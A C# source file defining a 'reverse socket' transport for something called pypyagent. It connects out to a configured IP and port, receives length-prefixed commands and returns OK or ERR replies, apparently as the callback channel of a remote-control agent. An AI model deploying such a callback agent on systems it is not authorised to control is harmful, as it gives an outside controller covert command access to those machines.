using System;
using System.Net.Sockets;

namespace pypyagent
{
    class PYPYReverseSocketTransport
    {
        string ip;
        int port;
        TcpClient client;
        NetworkStream stream;

        public PYPYReverseSocketTransport(string ip, int port)
        {
            this.ip = ip;
            this.port = port;
        }

        public void connect()
        {
            this.client = new TcpClient(ip, port);
            this.stream = client.GetStream();
        }

        public PYPYCMD readCMD()
        {
            Byte[] buffer = new byte[1];
            int total_len = -1;
            int total_rec = 0;
            int buffer_end = 0;

            if (this.stream.CanRead)
            {
                while (true)
                {
                    Byte[] data = new Byte[256];
                    Int32 rec_len = this.stream.Read(data, 0, data.Length);
                    total_rec += rec_len;

                    if (rec_len < 1)
                        break;

                    if (total_rec > buffer.Length)
                    {
                        Array.Resize(ref buffer, total_rec);
                    }

                    Array.Copy(data, 0, buffer, buffer_end, rec_len);
                    buffer_end += rec_len;

                    if (total_len == -1)
                    {
                        if (buffer.Length < 4)
                            continue;

                        Byte[] len_bytes = new byte[4];
                        Array.Copy(buffer, 0, len_bytes, 0, 4);
                        Array.Reverse(len_bytes);
                        total_len = BitConverter.ToInt32(len_bytes, 0) + 4;
                    }

                    if (buffer.Length >= total_len)
                        break;

                }
                if (buffer.Length < 4)
                {
                    throw new Exception("CMD Recieve failed");
                }

                byte[] cmd_data = new byte[buffer.Length - 4];
                Array.Copy(buffer, 4, cmd_data, 0, cmd_data.Length);
                return PYPYCMD.from_bytes(cmd_data);
            }

            throw new Exception("Cant read from stream!");
        }

        public void send(PYPYCMD cmd)
        {
            byte[] data = cmd.to_bytes();
            byte[] len = BitConverter.GetBytes(data.Length);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(len);
            this.stream.Write(len, 0, len.Length);
            this.stream.Write(data, 0, data.Length);
        }

        public void sendOK(byte[] var1 = null, byte[] var2 = null)
        {
            PYPYCMD cmd = new PYPYCMD();
            cmd.cmdtype = PYPYCMDType.OK;
            if (var1 != null)
            {
                cmd.parameters.Add(var1);
                if(var2 != null)
                    cmd.parameters.Add(var2);
            }
            this.send(cmd);
        }

        public void sendERR(byte[] var1 = null, byte[] var2 = null)
        {
            PYPYCMD cmd = new PYPYCMD();
            cmd.cmdtype = PYPYCMDType.ERR;
            if (var1 != null)
            {
                cmd.parameters.Add(var1);
                if (var2 != null)
                    cmd.parameters.Add(var2);
            }
            this.send(cmd);
        }

    }
}
